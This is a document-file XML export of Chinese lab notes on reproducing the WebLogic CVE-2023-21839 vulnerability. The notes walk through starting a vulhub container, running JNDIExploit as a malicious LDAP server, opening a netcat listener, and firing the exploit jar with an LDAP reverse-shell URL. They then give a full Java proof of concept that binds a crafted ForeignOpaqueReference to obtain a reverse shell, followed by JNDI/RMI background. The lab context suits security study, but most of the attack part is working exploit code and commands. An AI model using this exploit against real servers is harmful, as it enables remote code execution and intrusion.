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, monospace"/>
    <style:font-face style:name="JetBrains Mono" svg:font-family="'JetBrains Mono', monospace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1faae" officeooo:paragraph-rsid="0011faae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officeooo:paragraph-rsid="0015a3ed"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0011faae"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00155654"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="0015a3e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复现weblogic CVE-2023-21839漏洞环境：</text:p>
      <text:p text:style-name="Standard">需要安装oracle版本的java1.8，在同一台电脑上模拟一个服务器和一个攻击机，服务器ip为127.0.0.1，服务端口为7001,攻击机ip为192.168.8.100，需要的工具有JNDIExploit-1.3-SNAPSHOT.jar、Weblogic-CVE-2023-21839.jar、weblogic docker，通过以下步骤</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">1. </text:span>使用weblogic的docker环境，在vulhub/weblogic/CVE-2023-21839中</text:p>
      <text:p text:style-name="Standard">服务器启动docker中的weblogic程序，运行命令：</text:p>
      <text:p text:style-name="Standard">sudo docker-compose ps</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">2. </text:span>攻击机启动JNDI监听，启动ldap服务器：</text:p>
      <text:p text:style-name="Standard">java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 192.168.8.100</text:p>
      <text:p text:style-name="P3">ldap服务器在放了构造好的恶意代码</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">3. </text:span>攻击机启动netcat监听：</text:p>
      <text:p text:style-name="Standard">nc -lvvp 8888</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T1">4. </text:span>攻击机执行攻击payload：</text:p>
      <text:p text:style-name="Standard">java -jar ./Weblogic-CVE-2023-21839.jar 127.0.0.1:7001 <text:a xlink:type="simple" xlink:href="ldap://192.168.8.100:1389/Basic/ReverseShell/192.168.8.100/8888" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">ldap://192.168.8.100:1389/Basic/ReverseShell/192.168.8.100/8888</text:a></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P1">除了通过工具执行攻击payload之外，还可以通过java执行poc代码，poc如下：</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="Standard">import javax.naming.Context;</text:p>
      <text:p text:style-name="Standard">import javax.naming.InitialContext;</text:p>
      <text:p text:style-name="Standard">import javax.naming.NamingException;</text:p>
      <text:p text:style-name="Standard">import java.lang.reflect.Field;</text:p>
      <text:p text:style-name="Standard">import java.util.Hashtable;</text:p>
      <text:p text:style-name="Standard">import java.util.Random;</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">public class poc {</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="4"/>private static String GetRandomString(){</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>// 定义一个字符串数组，包含abcdef和1234567890这些字符</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>String[] chars = {"a", "b", "c", "d", "e", "f", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"};</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>// 创建一个随机数生成器</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>Random random = new Random();</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>// 创建一个字符串缓冲区，用于存储生成的字符串</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>StringBuffer sb = new StringBuffer();</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>// 循环五次，每次从数组中随机挑选一个字符，拼接到字符串缓冲区中</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>for (int i = 0; i &lt; 5; i++) {</text:p>
      <text:p text:style-name="Standard"><text:s text:c="12"/>// 生成一个0到15之间的随机整数，作为数组的索引</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/><text:s text:c="12"/>int index = random.nextInt(16);</text:p>
      <text:p text:style-name="Standard"><text:s text:c="12"/>// 根据索引从数组中取出一个字符</text:p>
      <text:p text:style-name="Standard"><text:s text:c="12"/>String s = chars[index];</text:p>
      <text:p text:style-name="Standard"><text:s text:c="12"/>// 将字符追加到字符串缓冲区中</text:p>
      <text:p text:style-name="Standard"><text:s text:c="12"/>sb.append(s);</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>}</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>// 将字符串缓冲区转换为字符串</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>String result = sb.toString();</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>// 返回结果</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>return result;</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>private static InitialContext getInitialContext(String url)throws NamingException</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>{</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>Hashtable&lt;String,String&gt; env = new Hashtable&lt;String,String&gt;();</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>env.put(Context.PROVIDER_URL, url);</text:p>
      <text:p text:style-name="Standard">// <text:s text:c="7"/>System.out.println(Context.INITIAL_CONTEXT_FACTORY);</text:p>
      <text:p text:style-name="Standard">// <text:s text:c="7"/>System.out.println(Context.PROVIDER_URL);</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>return new InitialContext(env);</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>//iiop</text:p>
      <text:p text:style-name="Standard"><text:s text:c="4"/>public static void main(String args[]) throws Exception {</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>InitialContext c=getInitialContext("t3://172.20.0.2:7001");</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>Hashtable&lt;String,String&gt; env = new Hashtable&lt;String,String&gt;();</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="8"/>env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>weblogic.deployment.jms.ForeignOpaqueReference f=new weblogic.deployment.jms.ForeignOpaqueReference();</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>jndiEnvironment.setAccessible(true);</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>jndiEnvironment.set(f,env);</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("remoteJNDIName");</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>remoteJNDIName.setAccessible(true);</text:p>
      <text:p text:style-name="Standard">// <text:s text:c="7"/>remoteJNDIName.set(f,"ldap://192.168.8.100:1389/Basic/Command/calc");</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>remoteJNDIName.set(f,"ldap://192.168.8.100:1389/Basic/ReverseShell/192.168.8.100/8888");</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="8"/>String randStr=GetRandomString();</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>System.out.println("the random string is "+randStr);</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/><text:s text:c="8"/>c.bind(randStr,f);</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>c.lookup(randStr);</text:p>
      <text:p text:style-name="Standard"><text:s text:c="8"/>System.out.println("end");</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:s text:c="4"/>}</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">}</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">调试环境：</text:p>
      <text:p text:style-name="Standard">配置IDEA调试环境，需要用IDEA调试服务器的话，需要将服务器以debug模式运行，同时开启调试端口，然后IDEA在运行设置里选择远程调试，输入调试端口，此外，还需要将服务器的jar代码提取出来，然后把这些代码添加为模块依赖，IDEA会自动对这些代码进行反汇编得到java代码，在这些代码上打上断点，再使用工具或者代码向服务器发出请求，即可触发服务器代码断点。</text:p>
      <text:p text:style-name="P3">最后触发漏洞的代码在 weblogic.<text:span text:style-name="T3">deployment.</text:span>ForeignOpaqueReference类中的<text:span text:style-name="T3">155行，即</text:span> retVal = context.lookup(evalMacros(this.remoteJNDIName));当weblogic服务器在远程调用lookup函数查询恶意对象的时候会加在恶意代码。</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="P2">相关背景知识：</text:p>
      <text:p text:style-name="Standard">1. rmi远程方法调用，是java远程方法调用的一个接口，客户端进行远程方法调用的前提有相应方法的接口，服务器有这个接口的实现，然后服务器使用接口实现类创建一个对象，并将这个对象绑定在rmi注册表，这样客户端就可以通过rmi协议+服务器ip+对象名去调用相应的远程方法，但实际上服务器并没有把远程方法返回，而是接收客户端的参数然后在自己这里执行这些方法，再把结果返回到客户端（此外rmi的通信端口一般是1099,而远程方法调用则会再随机分配一个端口）</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">2. JNDI，JNDI是命名和目录服务，可以通过对象名获得对象的引用，JNDI可以将rmi作为底层协议，进行远程方法调用，除了rmi之外，JNDI还可以把ldap等协议作为底层协议，向上提供统一的接口，更加方便。用JNDI的话，一般以Context作为入口，Context设置好环境，和远程服务提供者url，再通过bind和lookup函数绑定对象和查找对象</text:p>
      <text:p text:style-name="Standard">// 创建属性 Hashtable</text:p>
      <text:p text:style-name="Standard">Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();</text:p>
      <text:p text:style-name="Standard">env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");</text:p>
      <text:p text:style-name="Standard">env.put(Context.PROVIDER_URL, "rmi://localhost:1099");</text:p>
      <text:p text:style-name="Standard">// 创建 JNDI 上下文</text:p>
      <text:p text:style-name="Standard">Context context = new InitialContext(env);</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">3. Reference：</text:p>
      <text:p text:style-name="Standard">在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard">整个利用流程如下：</text:p>
      <text:p text:style-name="Standard"><text:s text:c="2"/><text:span text:style-name="T2">1.</text:span> <text:s text:c="2"/>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/><text:s text:c="2"/><text:span text:style-name="T2">2.</text:span> <text:s text:c="2"/>攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；</text:p>
      <text:p text:style-name="Standard"><text:s text:c="2"/><text:span text:style-name="T2">3.</text:span> <text:s/>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</text:p>
      <text:p text:style-name="Standard"><text:s text:c="2"/><text:span text:style-name="T2">4.</text:span> <text:s/>目标在进行lookup()操作时，会动态加载并实例化Factory类（首先会获取到Reference对象，获取到Reference对象后，会去寻找Reference中指定的Factory类，如果查找不到则会在Reference中指定的远程地址去进行请求这个Factory类），接着调用factory.getObjectInstance()获取外部远程对象实例；</text:p>
      <text:p text:style-name="Standard"><text:s text:c="2"/><text:span text:style-name="T2">5.</text:span> <text:s/>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；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, monospace"/>
    <style:font-face style:name="JetBrains Mono" svg:font-family="'JetBrains Mono', monospace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1T14:28:30.863048091</meta:creation-date>
    <meta:generator>LibreOffice/6.0.7.3$Linux_X86_64 LibreOffice_project/00m0$Build-3</meta:generator>
    <meta:editing-cycles>0</meta:editing-cycles>
    <meta:editing-duration>P0D</meta:editing-duration>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="91" meta:word-count="1467" meta:character-count="4883" meta:non-whitespace-character-count="4328"/>
  </office:meta>
</office:document-meta>
</file>